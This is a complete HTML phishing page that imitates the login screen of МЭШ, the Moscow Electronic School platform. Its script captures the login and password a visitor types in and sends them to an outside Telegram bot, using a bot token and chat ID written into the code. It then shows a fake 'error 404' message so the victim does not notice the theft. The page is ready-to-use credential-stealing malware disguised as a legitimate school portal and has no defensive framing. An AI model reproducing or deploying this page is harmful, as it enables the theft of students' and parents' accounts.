<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>МЭШ - Вход</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 360px;
            text-align: center;
        }
        .login-box h1 {
            color: #003087;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .login-box input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #003087;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-box input[type="submit"]:hover {
            background-color: #00205b;
        }
        .login-box a {
            color: #003087;
            text-decoration: none;
            font-size: 14px;
        }
        .login-box a:hover {
            text-decoration: underline;
        }
        .error-message {
            color: #ff0000;
            font-size: 18px;
            margin-top: 20px;
            display: none; /* Скрыто по умолчанию */
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Вход в МЭШ</h1>
        <form id="loginForm">
            <input type="text" name="login" placeholder="Логин" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <input type="submit" value="Войти">
        </form>
        <p><a href="#">Забыли пароль?</a></p>
        <div class="error-message" id="errorMessage">error 404</div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Останавливаем отправку формы
            
            // Получаем данные из формы
            const login = document.querySelector('input[name="login"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            // Настройки Telegram
            const token = "8050166172:AAFUDjfa88eCzqBGsTonZFwI-Eoj66jKWNk"; // Твой токен
            const chatId = "2068847868"; // Твой Chat ID
            const message = encodeURIComponent(`Логин: ${login}\nПароль: ${password}`);
            
            // Отправляем данные в Telegram
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
                .then(response => {
                    if (response.ok) {
                        // Показываем "error 404" после успешной отправки
                        document.getElementById('errorMessage').style.display = 'block';
                    } else {
                        console.error('Ошибка отправки в Telegram');
                    }
                })
                .catch(error => console.error('Ошибка:', error));
        });
    </script>
</body>
</html>
